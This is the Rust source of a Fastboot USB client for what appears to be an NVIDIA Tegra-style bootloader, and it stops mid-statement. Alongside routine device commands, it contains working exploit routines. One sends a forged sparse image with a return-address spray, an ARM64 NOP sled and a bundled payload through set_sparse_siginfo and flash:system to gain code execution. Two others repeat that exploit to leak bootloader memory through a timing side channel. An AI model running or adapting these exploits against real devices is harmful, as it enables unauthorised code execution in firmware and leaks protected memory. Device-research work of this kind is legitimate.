#![feature(iter_intersperse)]

pub mod args;
pub mod fastboot;

use std::{io::Write, process::ExitCode, time::Instant};

use clap::Parser;
use indicatif::{ProgressBar, ProgressState, ProgressStyle};
use tracing_subscriber::EnvFilter;

#[derive(Debug, thiserror::Error)]
enum GetDevicesError {
    #[error("Failed to iterate USB devices: {0}")]
    IterateUsb(rusb::Error),
}

fn get_devices() -> Result<Vec<fastboot::FastbootDevice>, GetDevicesError> {
    let mut devices = Vec::new();

    let raw_devices = match rusb::devices() {
        Ok(devices) => devices,
        Err(why) => {
            return Err(GetDevicesError::IterateUsb(why));
        }
    };

    for device in raw_devices.iter() {
        let device = match fastboot::FastbootDevice::init_if_fastboot(device) {
            Ok(Some(device)) => device,
            Ok(None) => continue,
            Err(why) => {
                tracing::debug!("Failed to initialise device: {why}");
                continue;
            }
        };

        tracing::info!(
            "Found a Fastboot device with serial number: '{}' (manufacturer: '{}')",
            device.serial(),
            device.manufacturer().unwrap_or("UNKNOWN")
        );

        devices.push(device);
    }

    Ok(devices)
}

fn main() -> ExitCode {
    let args = args::CliArgs::parse();

    match EnvFilter::builder()
        .with_env_var("FBRS_TRACE")
        .try_from_env()
    {
        Ok(filter) => {
            tracing_subscriber::fmt().with_env_filter(filter).init();
        }
        Err(_) => {
            tracing_subscriber::fmt()
                .with_max_level(
                    args.log_level
                        .map(tracing::Level::from)
                        .unwrap_or(tracing::Level::WARN),
                )
                .init();
        }
    };

    let start = Instant::now();

    let devices = match get_devices() {
        Ok(devices) => devices,
        Err(why) => {
            eprintln!("{why}");
            return ExitCode::FAILURE;
        }
    };

    if let Err(why) = run_command(devices, args) {
        eprintln!("{why}");
        return ExitCode::FAILURE;
    }

    println!("Finished in {:.02}s!", start.elapsed().as_secs_f64());
    ExitCode::SUCCESS
}

#[derive(Debug, thiserror::Error)]
pub enum FindDeviceError {
    #[error("No Fastboot device found!")]
    NoDevices,
    #[error(
        "Found {0} Fastboot devices. You must specify the desired device's serial number with the '-s' flag when multiple are connected. You can use the 'devices' command to view the serial numbers of all connected Fastboot devices."
    )]
    TooManyDevices(usize),
    #[error("Failed to find device '{0}'")]
    MissingDevice(String),
}

fn find_chosen_device(
    devices: Vec<fastboot::FastbootDevice>,
    serial: Option<&str>,
) -> Result<fastboot::FastbootDevice, FindDeviceError> {
    if devices.len() == 0 {
        return Err(FindDeviceError::NoDevices);
    }

    let Some(serial) = serial else {
        return match devices.len() {
            0 => Err(FindDeviceError::NoDevices),
            1 => Ok(devices.into_iter().next().unwrap()),
            amt => Err(FindDeviceError::TooManyDevices(amt)),
        };
    };

    match devices.into_iter().find(|device| device.serial() == serial) {
        Some(device) => Ok(device),
        None => Err(FindDeviceError::MissingDevice(serial.to_string())),
    }
}

#[derive(Debug, thiserror::Error)]
pub enum CommandError {
    #[error(transparent)]
    Device(fastboot::FastbootDeviceRuntimeError),
    #[error(transparent)]
    MissingDevice(FindDeviceError),
    #[error("Variable name '{0}' is too long")]
    GetvarTooLong(String),
    #[error("OEM command '{0}' is too long")]
    OemTooLong(String),
    #[error("Device reported error whilst running command: '{0}'")]
    Fail(String),
    #[error("Device gave an invalid response")]
    InvalidResponse,
    #[error("IO Error: {0}")]
    Io(std::io::Error),
    #[error("Specified file too large, maximum size by protocol is 4294967295 bytes")]
    DownloadFileTooLarge,
    #[error("Device returned ready to send {1} bytes when we requested to send {0}")]
    DownloadLengthMismatch(usize, usize),
    #[error("Address must be 4-byte aligned")]
    UnalignedAddress,
}

fn run_command(
    devices: Vec<fastboot::FastbootDevice>,
    args: args::CliArgs,
) -> Result<(), CommandError> {
    match args.command {
        args::Command::Devices => {
            println!("Found {} devices:", devices.len());

            for device in devices {
                match device.manufacturer() {
                    Some(manufacturer) => println!("{} ({manufacturer})", device.serial()),
                    None => println!("{}", device.serial()),
                }
            }
        }
        args::Command::Continue => {
            let device = find_chosen_device(devices, args.serial.as_deref())
                .map_err(CommandError::MissingDevice)?;

            let command_response = device
                .send_command("continue")
                .map_err(CommandError::Device)?;

            match command_response {
                fastboot::SendCommandResponse::Fail(why) => return Err(CommandError::Fail(why)),
                fastboot::SendCommandResponse::Ok(value) => {
                    println!("OK {value}");
                }
                fastboot::SendCommandResponse::Data(_) => {
                    tracing::debug!("Device sent a DATA response to boot command");
                    return Err(CommandError::InvalidResponse);
                }
            }
        }
        args::Command::Exploit => {
            drop(devices);
            const PAYLOAD: &[u8] = include_bytes!("payload.bin");
            const SIGNATURE: &[u8] = include_bytes!("../system-sparse-sig.bin");
            const HEADER: &[u8; 28] = &[
                0x3A, 0xFF, 0x26, 0xED, 0x01, 0x00, 0x00, 0x00, 0x1C, 0x00, 0x60, 0x00, 0x00, 0x10,
                0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x69, 0x69, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            ];
            const DOWNLOAD_BASE: usize = 0xb7b44000;
            let payload_offset = 0x60000;
            assert!(payload_offset >= HEADER.len() + 0x1000 + 0x10000);
            let payload_len = payload_offset + PAYLOAD.len();
            // payload_len += 0x1000 - (payload_len % 0x1000);
            let mut payload = vec![0u8; payload_len as usize];
            // let payload_start = payload.len() - PAYLOAD.len();
            payload[..HEADER.len()].copy_from_slice(HEADER);
            payload[payload_offset..(payload_offset + PAYLOAD.len())].copy_from_slice(&PAYLOAD);
            let mut write_offset = HEADER.len() + 0x1000;

            while write_offset < payload_offset {
                payload[write_offset] = 0x1F;
                write_offset += 1;
                payload[write_offset] = 0x20;
                write_offset += 1;
                payload[write_offset] = 0x03;
                write_offset += 1;
                payload[write_offset] = 0xD5;
                write_offset += 1;
            }

            let signature_download_command = format!("download:{:08x}", SIGNATURE.len());
            let payload_download_command = format!("download:{:08x}", payload.len());

            let addr = DOWNLOAD_BASE + 0x8000;
            let addr_bytes = addr.to_le_bytes();
            let mut write_offset = HEADER.len() + 0;
            while write_offset < HEADER.len() + 0x1000 {
                payload[write_offset..write_offset + 8].copy_from_slice(&addr_bytes);
                write_offset += 8;
            }
            let device = find_chosen_device(get_devices().unwrap(), args.serial.as_deref())
                .map_err(CommandError::MissingDevice)?;

            println!("Running!");

            let command_response = device
                .send_command(&signature_download_command)
                .map_err(CommandError::Device)?;
            match command_response {
                fastboot::SendCommandResponse::Fail(why) => {
                    return Err(CommandError::Fail(why));
                }
                fastboot::SendCommandResponse::Ok(_) => {
                    tracing::debug!("Device sent an OKAY response to a download command");
                    return Err(CommandError::InvalidResponse);
                }
                fastboot::SendCommandResponse::Data(length) => {
                    if length as usize != SIGNATURE.len() {
                        return Err(CommandError::DownloadLengthMismatch(
                            SIGNATURE.len(),
                            length as usize,
                        ));
                    }
                }
            }

            device.send_data(SIGNATURE).map_err(CommandError::Device)?;

            let response = device.read_response_full().map_err(CommandError::Device)?;
            match response {
                fastboot::SendCommandResponse::Fail(why) => {
                    return Err(CommandError::Fail(why));
                }
                fastboot::SendCommandResponse::Ok(_) => {
                    println!("Successfully transferred signature!");
                }
                fastboot::SendCommandResponse::Data(_) => {
                    tracing::debug!("Device sent an DATA response to a finished download command");
                    return Err(CommandError::InvalidResponse);
                }
            }

            let command_response = device
                .send_command("set_sparse_siginfo")
                .map_err(CommandError::Device)?;

            match command_response {
                fastboot::SendCommandResponse::Fail(why) => {
                    return Err(CommandError::Fail(why));
                }
                fastboot::SendCommandResponse::Ok(value) => {
                    println!("OK {value}");
                }
                fastboot::SendCommandResponse::Data(_) => {
                    tracing::debug!("Device sent a DATA response to set_sparse_siginfo command");
                    return Err(CommandError::InvalidResponse);
                }
            }

            let command_response = device
                .send_command(&payload_download_command)
                .map_err(CommandError::Device)?;
            match command_response {
                fastboot::SendCommandResponse::Fail(why) => {
                    return Err(CommandError::Fail(why));
                }
                fastboot::SendCommandResponse::Ok(_) => {
                    tracing::debug!("Device sent an OKAY response to a download command");
                    return Err(CommandError::InvalidResponse);
                }
                fastboot::SendCommandResponse::Data(length) => {
                    if (length as usize) < payload.len() {
                        return Err(CommandError::DownloadLengthMismatch(
                            payload.len(),
                            length as usize,
                        ));
                    }
                }
            }

            device.send_data(&payload).map_err(CommandError::Device)?;

            let response = device.read_response_full().map_err(CommandError::Device)?;
            match response {
                fastboot::SendCommandResponse::Fail(why) => {
                    return Err(CommandError::Fail(why));
                }
                fastboot::SendCommandResponse::Ok(_) => {
                    println!("Successfully transferred payload!");
                }
                fastboot::SendCommandResponse::Data(_) => {
                    tracing::debug!("Device sent an DATA response to a finished download command");
                    return Err(CommandError::InvalidResponse);
                }
            }

            let command_response = device
                .send_command("flash:system")
                .map_err(CommandError::Device)?;

            println!("Flash Resp: {command_response:?}");

            std::thread::sleep(std::time::Duration::from_millis(250));
            let device = find_chosen_device(get_devices().unwrap(), args.serial.as_deref())
                .map_err(CommandError::MissingDevice)?;
            println!(
                "Opened device! Serial={}, Mfg={}",
                device.serial(),
                device.manufacturer().unwrap_or("UNKNOWN")
            );

            let response = device.send_command("owo").map_err(CommandError::Device)?;
            match response {
                fastboot::SendCommandResponse::Fail(why) => {
                    return Err(CommandError::Fail(why));
                }
                fastboot::SendCommandResponse::Ok(response) => {
                    println!("{response}");
                }
                fastboot::SendCommandResponse::Data(_) => {
                    tracing::debug!("Device sent an DATA response to owo");
                    return Err(CommandError::InvalidResponse);
                }
            }
        }
        args::Command::DumpFlash {
            sector_start,
            sector_count,
        } => {
            let device = find_chosen_device(devices, args.serial.as_deref())
                .map_err(CommandError::MissingDevice)?;

            let command = format!("dump-flash:{sector_start:016X}:{sector_count:016X}");
            let response = device
                .send_command(&command)
                .map_err(CommandError::Device)?;

            match response {
                fastboot::SendCommandResponse::Fail(why) => {
                    return Err(CommandError::Fail(why));
                }
                fastboot::SendCommandResponse::Ok(_) => {
                    tracing::debug!("Device sent an OKAY response to dump?");
                    return Err(CommandError::InvalidResponse);
                }
                fastboot::SendCommandResponse::Data(amount) => {
                    let mut data = vec![0u8; amount as usize];
                    println!("Reading flash dump ({amount} bytes)...");
                    let pb = ProgressBar::new(amount as u64);
                    pb.set_style(
                        ProgressStyle::with_template(
                            "[{elapsed_precise}] [{wide_bar}] {bytes}/{total_bytes} ({eta})",
                        )
                        .unwrap()
                        .with_key(
                            "eta",
                            |state: &ProgressState, w: &mut dyn std::fmt::Write| {
                                write!(w, "{:.1}s", state.eta().as_secs_f64()).unwrap()
                            },
                        )
                        .progress_chars("#>-"),
                    );
                    let mut amt_read = 0u64;
                    for chunk in data.chunks_mut(64 * 1024) {
                        device.read_data(chunk).map_err(CommandError::Device)?;
                        amt_read += chunk.len() as u64;
                        pb.set_position(amt_read);
                    }
                    pb.finish();
                    let seconds = std::time::SystemTime::now()
                        .duration_since(std::time::UNIX_EPOCH)
                        .unwrap()
                        .as_secs();
                    let real_offset = sector_start * 4096;
                    let file_name = format!(
                        "./flash_{real_offset:#018X}-{:#018X}_{seconds}.bin",
                        real_offset + (sector_count * 4096)
                    );
                    println!("Read flash dump! Saving it to {file_name}");
                    std::fs::write(file_name, data).unwrap();
                }
            }
        }
        args::Command::DumpQspi => {
            let device = find_chosen_device(devices, args.serial.as_deref())
                .map_err(CommandError::MissingDevice)?;

            let response = device
                .send_command("dump-qspi")
                .map_err(CommandError::Device)?;

            match response {
                fastboot::SendCommandResponse::Fail(why) => {
                    return Err(CommandError::Fail(why));
                }
                fastboot::SendCommandResponse::Ok(_) => {
                    tracing::debug!("Device sent an OKAY response to dump?");
                    return Err(CommandError::InvalidResponse);
                }
                fastboot::SendCommandResponse::Data(amount) => {
                    let mut data = vec![0u8; amount as usize];
                    println!("Reading QSPI dump ({amount} bytes)...");
                    device.read_data(&mut data).map_err(CommandError::Device)?;
                    let seconds = std::time::SystemTime::now()
                        .duration_since(std::time::UNIX_EPOCH)
                        .unwrap()
                        .as_secs();
                    let file_name = format!("./qspi_flash_{seconds}.bin");
                    println!("Read QSPI dump! Saving it to {file_name}");
                    std::fs::write(file_name, data).unwrap();
                }
            }
        }
        args::Command::DumpMemory { address, length } => {
            let device = find_chosen_device(devices, args.serial.as_deref())
                .map_err(CommandError::MissingDevice)?;

            let command = format!("dump-mem:{address:08X}:{length:08X}");

            let response = device
                .send_command(&command)
                .map_err(CommandError::Device)?;
            match response {
                fastboot::SendCommandResponse::Fail(why) => {
                    return Err(CommandError::Fail(why));
                }
                fastboot::SendCommandResponse::Ok(_) => {
                    tracing::debug!("Device sent an OKAY response to dump?");
                    return Err(CommandError::InvalidResponse);
                }
                fastboot::SendCommandResponse::Data(amount) => {
                    let mut data = vec![0u8; amount as usize];
                    println!("Reading data dump ({amount} bytes)...");
                    device.read_data(&mut data).map_err(CommandError::Device)?;
                    let seconds = std::time::SystemTime::now()
                        .duration_since(std::time::UNIX_EPOCH)
                        .unwrap()
                        .as_secs();
                    let file_name = format!(
                        "./cboot_memory_{seconds}_{address:#010X}-{:#010X}.bin",
                        address + amount
                    );
                    println!("Read data dump! Saving it to {file_name}");
                    std::fs::write(file_name, data).unwrap();
                }
            }
        }
        args::Command::Poweroff => {
            let device = find_chosen_device(devices, args.serial.as_deref())
                .map_err(CommandError::MissingDevice)?;

            let command_response = device
                .send_command("poweroff")
                .map_err(CommandError::Device)?;

            match command_response {
                fastboot::SendCommandResponse::Fail(why) => return Err(CommandError::Fail(why)),
                fastboot::SendCommandResponse::Ok(value) => {
                    println!("OK {value}");
                }
                fastboot::SendCommandResponse::Data(_) => {
                    tracing::debug!("Device sent a DATA response to poweroff command");
                    return Err(CommandError::InvalidResponse);
                }
            }
        }
        args::Command::Reboot { mode } => {
            let device = find_chosen_device(devices, args.serial.as_deref())
                .map_err(CommandError::MissingDevice)?;

            let command = match mode {
                Some(args::RebootType::ThreeP) => "reboot:3p",
                Some(args::RebootType::ForcedRecovery) => "reboot-forced-recovery",
                Some(args::RebootType::Fastboot) => "reboot-bootloader",
                None => "reboot",
            };

            let command_response = device
                .send_command(&command)
                .map_err(CommandError::Device)?;

            match command_response {
                fastboot::SendCommandResponse::Fail(why) => return Err(CommandError::Fail(why)),
                fastboot::SendCommandResponse::Ok(value) => {
                    println!("OK {value}");
                }
                fastboot::SendCommandResponse::Data(_) => {
                    tracing::debug!("Device sent a DATA response to reboot command");
                    return Err(CommandError::InvalidResponse);
                }
            }
        }
        args::Command::ExploitHuntBytes { base } => {
            const KNOWN_LEN: u64 = 0x02000000;
            const PAYLOAD_LEN: u64 = 0x00080000;
            const BASE_ADDR: u64 = 0xB9B2_F000 - (KNOWN_LEN - PAYLOAD_LEN);

            drop(devices);
            const PAYLOAD: &[u8] = include_bytes!("payload.bin");
            const SIGNATURE: &[u8] = include_bytes!("../system-sparse-sig.bin");
            const HEADER: &[u8] = &[
                // 0x3A, 0xFF, 0x26, 0xED, 0x01, 0x00, 0x00, 0x00, 0x1C, 0x00, 0xa8, 0x00, 0x00, 0x10,
                0x3A, 0xFF, 0x26, 0xED, 0x01, 0x00, 0x00, 0x00, 0x1C, 0x00, 0x60, 0x00, 0x00, 0x10,
                0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x69, 0x69, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            ];
            let mut payload = vec![0u8; PAYLOAD_LEN as usize];
            let payload_start = payload.len() - PAYLOAD.len();
            payload[..HEADER.len()].copy_from_slice(HEADER);
            payload[payload_start..].copy_from_slice(&PAYLOAD);
            let mut write_offset = HEADER.len() + 0x1000;

            while write_offset < payload_start {
                payload[write_offset] = 0x1F;
                write_offset += 1;
                payload[write_offset] = 0x20;
                write_offset += 1;
                payload[write_offset] = 0x03;
                write_offset += 1;
                payload[write_offset] = 0xD5;
                write_offset += 1;
            }

            let signature_download_command = format!("download:{:08x}", SIGNATURE.len());
            let payload_download_command = format!("download:{:08x}", payload.len());

            let addr_bytes = BASE_ADDR.to_le_bytes();
            let mut write_offset = HEADER.len() + 0;
            while write_offset < HEADER.len() + 0x100 {
                payload[write_offset..write_offset + 8].copy_from_slice(&addr_bytes);
                write_offset += 8;
            }

            const START_ADDRESS: u32 = 0x96000000u32;
            let start_address = base.unwrap_or(START_ADDRESS);
            let mut file = std::fs::File::options()
                .create(true)
                .append(true)
                .open(format!("./dump_{start_address:#010X}.bin"))
                .unwrap();
            let file_len = file.metadata().unwrap().len();

            let mut starting_addr = start_address + file_len as u32;

            println!(
                "File len is {file_len} ({file_len:#X}) bytes, so starting address is {starting_addr:#010X} (base was {start_address:#010X})"
            );

            let mut device = find_chosen_device(get_devices().unwrap(), args.serial.as_deref())
                .map_err(CommandError::MissingDevice)?;
            loop {
                if &payload[(payload_start + 0x80)..(payload_start + 0x84)] != b"\x10\x10\x10\x10" {
                    panic!("Running with bad payload type");
                }

                payload[(payload_start + 0x84)..(payload_start + 0x88)]
                    .copy_from_slice(&starting_addr.to_le_bytes());

                payload[(payload_start + 0x88)..(payload_start + 0x8c)]
                    .copy_from_slice(&[0, 0, 0, 0]);

                let run_start = std::time::Instant::now();
                let mut byte_val = 0;

                let _response = device
                    .send_command(&signature_download_command)
                    .map_err(CommandError::Device)?;
                device.send_data(SIGNATURE).map_err(CommandError::Device)?;
                let _response = device.read_response_full().map_err(CommandError::Device)?;
                let _response = device
                    .send_command("set_sparse_siginfo")
                    .map_err(CommandError::Device)?;

                let _response = device
                    .send_command(&payload_download_command)
                    .map_err(CommandError::Device)?;
                device.send_data(&payload).map_err(CommandError::Device)?;
                let _response = device.read_response_full().map_err(CommandError::Device)?;

                let _response = device
                    .send_command("flash:system")
                    .map_err(CommandError::Device)?;

                let start = std::time::Instant::now();
                device = find_chosen_device(get_devices().unwrap(), args.serial.as_deref())
                    .map_err(CommandError::MissingDevice)?;
                let elapsed = start.elapsed();
                let remafter = ((elapsed.as_micros() - 3040000) / 100000) as u8;
                byte_val |= remafter;
                // println!("Finding device took {:.03}s {}µs, (rem={})(remafter={remafter})", elapsed.as_secs_f64(), elapsed.as_micros(), elapsed.as_micros() - 3040000);

                payload[(payload_start + 0x88)..(payload_start + 0x8C)]
                    .copy_from_slice(&[0, 0, 0, 1]);

                let _response = device
                    .send_command(&signature_download_command)
                    .map_err(CommandError::Device)?;
                device.send_data(SIGNATURE).map_err(CommandError::Device)?;
                let _response = device.read_response_full().map_err(CommandError::Device)?;
                let _response = device
                    .send_command("set_sparse_siginfo")
                    .map_err(CommandError::Device)?;

                let _response = device
                    .send_command(&payload_download_command)
                    .map_err(CommandError::Device)?;
                device.send_data(&payload).map_err(CommandError::Device)?;
                let _response = device.read_response_full().map_err(CommandError::Device)?;

                let _response = device
                    .send_command("flash:system")
                    .map_err(CommandError::Device)?;

                let start = std::time::Instant::now();
                device = find_chosen_device(get_devices().unwrap(), args.serial.as_deref())
                    .map_err(CommandError::MissingDevice)?;
                let elapsed = start.elapsed();
                let remafter = ((elapsed.as_micros() - 3040000) / 100000) as u8;
                byte_val |= remafter << 4;
                // println!("Finding device took {:.03}s {}µs, (rem={})(remafter={remafter})", elapsed.as_secs_f64(), elapsed.as_micros(), elapsed.as_micros() - 3040000);

                println!(
                    "Addr {starting_addr:#010X} = {byte_val:#02X} (byte took {:.02}s)",
                    run_start.elapsed().as_secs_f64()
                );

                file.write_all(&[byte_val]).unwrap();

                if starting_addr % 16 == 0 {
                    file.flush().unwrap();
                }

                starting_addr += 1;
            }
        }
        args::Command::ExploitHuntInstruction {
            start_address,
            instruction,
        } => {
            const KNOWN_LEN: u64 = 0x02000000;
            const PAYLOAD_LEN: u64 = 0x00080000;
            const BASE_ADDR: u64 = 0xB9B2_F000 - (KNOWN_LEN - PAYLOAD_LEN);

            drop(devices);
            const PAYLOAD: &[u8] = include_bytes!("payload.bin");
            const SIGNATURE: &[u8] = include_bytes!("../system-sparse-sig.bin");
            const HEADER: &[u8] = &[
                // 0x3A, 0xFF, 0x26, 0xED, 0x01, 0x00, 0x00, 0x00, 0x1C, 0x00, 0xa8, 0x00, 0x00, 0x10,
                0x3A, 0xFF, 0x26, 0xED, 0x01, 0x00, 0x00, 0x00, 0x1C, 0x00, 0x60, 0x00, 0x00, 0x10,
                0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x69, 0x69, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            ];
            let mut payload = vec![0u8; PAYLOAD_LEN as usize];
            let payload_start = payload.len() - PAYLOAD.len();
            payload[..HEADER.len()].copy_from_slice(HEADER);
            payload[payload_start..].copy_from_slice(&PAYLOAD);
            let mut write_offset = HEADER.len() + 0x1000;

            while write_offset < payload_start {
                payload[write_offset] = 0x1F;
                write_offset += 1;
                payload[write_offset] = 0x20;
                write_offset += 1;
                payload[write_offset] = 0x03;
                write_offset += 1;
                payload[write_offset] = 0xD5;
                write_offset += 1;
            }

            let signature_download_command = format!("download:{:08x}", SIGNATURE.len());
            let payload_download_command = format!("download:{:08x}", payload.len());

            let addr_bytes = BASE_ADDR.to_le_bytes();
            let mut write_offset = HEADER.len() + 0;
            while write_offset < HEADER.len() + 0x100 {
                payload[write_offset..write_offset + 8].copy_from_slice(&addr_bytes);
                write_offset += 8;
            }

            const START_ADDRESS: u32 = 0x96000000u32;
            let start_address = start_address.unwrap_or(START_ADDRESS);
            const END_ADDRESS: u32 = 0x96000000u32 + 0x8_0000;

            let mut byte_offset = 0u32;

            let mut device = find_chosen_device(get_devices().unwrap(), args.serial.as_deref())
                .map_err(CommandError::MissingDevice)?;
            let mut dumped_instr_addr = 0u32;

            if &payload[(payload_start + 0x80)..(payload_start + 0x84)] != b"\x20\x20\x20\x20" {
                panic!("Running with bad payload type");
            }

            const MASK: u32 = !0u32; // !0b11111u32

            let base = {
                let mut bases = [0u128; 4];

                println!("Finding timing base...");
                for idx in 0..4 {
                    let mut header_write_addr = 0x84;
                    payload[(payload_start + header_write_addr)
                        ..(payload_start + header_write_addr + 4)]
                        .copy_from_slice(&start_address.to_le_bytes());
                    header_write_addr += 4;

                    payload[(payload_start + header_write_addr)
                        ..(payload_start + header_write_addr + 4)]
                        .copy_from_slice(&END_ADDRESS.to_le_bytes());
                    header_write_addr += 4;

                    payload[(payload_start + header_write_addr)
                        ..(payload_start + header_write_addr + 4)]
                        .copy_from_slice(&instruction);
                    // .copy_from_slice(&[0x38, 0x00, 0xa0, 0x52]);
                    header_write_addr += 4;

                    payload[(payload_start + header_write_addr)
                        ..(payload_start + header_write_addr + 4)]
                        .copy_from_slice(&MASK.to_le_bytes());
                    // .copy_from_slice(&(!0b11111u32).to_le_bytes());
                    header_write_addr += 4;

                    payload[(payload_start + header_write_addr)
                        ..(payload_start + header_write_addr + 4)]
                        .copy_from_slice(&byte_offset.to_le_bytes());
                    header_write_addr += 4;

                    let header_nibble_offset = payload_start + header_write_addr;
                    payload[header_nibble_offset..(header_nibble_offset + 4)]
                        .copy_from_slice(&[0, 0, 0, 0]);
                    header_write_addr += 4;

                    payload[(payload_start + header_write_addr)
                        ..(payload_start + header_write_addr + 4)]
                        .copy_from_slice(&[0, 0, 0, 1]);

                    let _response = device
                        .send_command(&signature_download_command)
                        .map_err(CommandError::Device)?;
                    device.send_data(SIGNATURE).map_err(CommandError::Device)?;
                    let _response = device.read_response_full().map_err(CommandError::Device)?;
                    let _response = device
                        .send_command("set_sparse_siginfo")
                        .map_err(CommandError::Device)?;

                    let _response = device
                        .send_command(&payload_download_command)
                        .map_err(CommandError::Device)?;
                    device.send_data(&payload).map_err(CommandError::Device)?;
                    let _response = device.read_response_full().map_err(CommandError::Device)?;

                    let _response = device
                        .send_command("flash:system")
                        .map_err(CommandError::Device)?;

                    let start = std::time::Instant::now();
                    device = find_chosen_device(get_devices().unwrap(), args.serial.as_deref())
                        .map_err(CommandError::MissingDevice)?;
                    let elapsed = start.elapsed();
                    bases[idx] = elapsed.as_micros();
                    println!(
                        "Finding device took {:.03}s {}µs",
                        elapsed.as_secs_f64(),
                        elapsed.as_micros()
                    );
                }

                let avg = (bases[0] + bases[1] + bases[2] + bases[3]) / 4;
                let base = (avg - (avg % 10000)) - 20000;

                println!("Found a timing base: {base} (bases: {bases:?}, avg: {avg})");

                base
            };

            while byte_offset != 4 {
                /*
                    pub mode: u32,
                    pub start_address: u32,
                    pub end_address: u32,
                    pub instruction: u32,
                    pub mask: u32,
                    pub offset: u32,
                    pub dump_hi_nibble: u32,
                    pub calculate_base_timing: u32,
                */

                let mut header_write_addr = 0x84;
                payload
                    [(payload_start + header_write_addr)..(payload_start + header_write_addr + 4)]
                    .copy_from_slice(&start_address.to_le_bytes());
                header_write_addr += 4;

                payload
                    [(payload_start + header_write_addr)..(payload_start + header_write_addr + 4)]
                    .copy_from_slice(&END_ADDRESS.to_le_bytes());
                header_write_addr += 4;

                payload
                    [(payload_start + header_write_addr)..(payload_start + header_write_addr + 4)]
                    .copy_from_slice(&instruction);
                // .copy_from_slice(&[0x38, 0x00, 0xa0, 0x52]);
                header_write_addr += 4;

                payload
                    [(payload_start + header_write_addr)..(payload_start + header_write_addr + 4)]
                    .copy_from_slice(&MASK.to_le_bytes());
                header_write_addr += 4;

                payload
                    [(payload_start + header_write_addr)..(payload_start + header_write_addr + 4)]
                    .copy_from_slice(&byte_offset.to_le_bytes());
                header_write_addr += 4;

                let header_nibble_offset = payload_start + header_write_addr;
                payload[header_nibble_offset..(header_nibble_offset + 4)]
                    .copy_from_slice(&[0, 0, 0, 0]);
                header_write_addr += 4;

                payload
                    [(payload_start + header_write_addr)..(payload_start + header_write_addr + 4)]
                    .copy_from_slice(&[0, 0, 0, 0]);

                let run_start = std::time::Instant::now();
                let mut byte_val = 0;

                let _response = device
                    .send_command(&signature_download_command)
                    .map_err(CommandError::Device)?;
                device.send_data(SIGNATURE).map_err(CommandError::Device)?;
                let _response = device.read_response_full().map_err(CommandError::Device)?;
                let _response = device
                    .send_command("set_sparse_siginfo")
                    .map_err(CommandError::Device)?;

                let _response = device
                    .send_command(&payload_download_command)
                    .map_err(CommandError::Device)?;
                device.send_data(&payload).map_err(CommandError::Device)?;
                let _response = device.read_response_full().map_err(CommandError::Device)?;

                let _response = device
                    .send_command("flash:system")
                    .map_err(CommandError::Device)?;

                let start = std::time::Instant::now();
                device = find_chosen_device(get_devices().unwrap(), args.serial.as_deref())
                    .map_err(CommandError::MissingDevice)?;
                let elapsed = start.elapsed();
                let remafter = ((elapsed.as_micros() - base) / 100000) as u8;
                byte_val |= remafter;
                println!(
                    "Finding device took {:.03}s {}µs, (rem={})(remafter={remafter})",
                    elapsed.as_secs_f64(),
                    elapsed.as_micros(),
                    elapsed.as_micros() - base
                );

                payload[header_nibble_offset..(header_nibble_offset + 4)]
                    .copy_from_slice(&[0, 0, 0, 1]);

                let _response = device
                    .send_command(&signature_download_command)
                    .map_err(CommandError::Device)?;
                device.send_data(SIGNATURE).map_err(CommandError::Device)?;
                let _response = device.read_response_full().map_err(CommandError::Device)?;
                let _response = device
                    .send_command("set_sparse_siginfo")
                    .map_err(CommandError::Device)?;

                let _response = device
                    .send_command(&payload_download_command)
                    .map_err(CommandError::Device)?;
                device.send_data(&payload).map_err(CommandError::Device)?;
                let _response = device.read_response_full().map_err(CommandError::Device)?;

                let _response = device
                    .send_command("flash:system")
                    .map_err(CommandError::Device)?;

                let start = std::time::Instant::now();
                device = find_chosen_device(get_devices().unwrap(), args.serial.as_deref())
                    .map_err(CommandError::MissingDevice)?;
                let elapsed = start.elapsed();
                let remafter = ((elapsed.as_micros() - base) / 100000) as u8;
                byte_val |= remafter << 4;
                println!(
                    "Finding device took {:.03}s {}µs, (rem={})(remafter={remafter})",
                    elapsed.as_secs_f64(),
                    elapsed.as_micros(),
                    elapsed.as_micros() - base
                );

                dumped_instr_addr |= (byte_val as u32) << (byte_offset * 8);
                println!(
                    "Address[{byte_offset}] = {byte_val:#02X} (byte took {:.02}s, addr so far: {dumped_instr_addr:#010X})",
                    run_start.elapsed().as_secs_f64()
                );

                byte_offset += 1;
            }

            println!("Dumped! Instruction lives at {dumped_instr_addr:#010X}")
        }
        args::Command::ReadU32 { address } => {
            if address % 4 != 0 {
                return Err(CommandError::UnalignedAddress);
            }

            let device = find_chosen_device(devices, args.serial.as_deref())
                .map_err(CommandError::MissingDevice)?;

            let command = format!("read-u32:{address:08X}");

            let response = device
                .send_command(&command)
                .map_err(CommandError::Device)?;
            match response {
                fastboot::SendCommandResponse::Fail(why) => {
                    return Err(CommandError::Fail(why));
                }
                fastboot::SendCommandResponse::Ok(_) => {
                    tracing::debug!("Device sent an OKAY response to read-u32?");
                    return Err(CommandError::InvalidResponse);
                }
                fastboot::SendCommandResponse::Data(amount) => {
                    if amount != 4 {
                        return Err(CommandError::DownloadLengthMismatch(amount as usize, 4));
                    }
                    let mut bytes = [0u8; 4];
                    device.read_data(&mut bytes).map_err(CommandError::Device)?;
                    println!(
                        "Address {address:#010X} = {:#010X}",
                        u32::from_le_bytes(bytes)
                    );
                }
            }

            let _response = device.read_response_full().map_err(CommandError::Device)?;
        }
        args::Command::Fuse { fuse_type } => {
            let device = find_chosen_device(devices, args.serial.as_deref())
                .map_err(CommandError::MissingDevice)?;

            let command_response = device
                .send_command(&format!("read-fuse-id:{:02X}", fuse_type as u8))
                .map_err(CommandError::Device)?;

            match command_response {
                fastboot::SendCommandResponse::Fail(why) => return Err(CommandError::Fail(why)),
                fastboot::SendCommandResponse::Ok(_) => {
                    tracing::debug!("Device sent an OKAY response to a fuse command");
                    return Err(CommandError::InvalidResponse);
                }
                fastboot::SendCommandResponse::Data(amt) => {
                    let mut buffer = vec![0u8; amt as usize];
                    device
                        .read_data(&mut buffer)
                        .map_err(CommandError::Device)?;
                    print!("Value: ");
                    for byte in buffer {
                        print!("{byte:02X}");
                    }
                    println!();
                }
            }

            _ = device.read_response_full().map_err(CommandError::Device)?;
        }
        args::Command::RawFuse { offset } => {
            let device = find_chosen_device(devices, args.serial.as_deref())
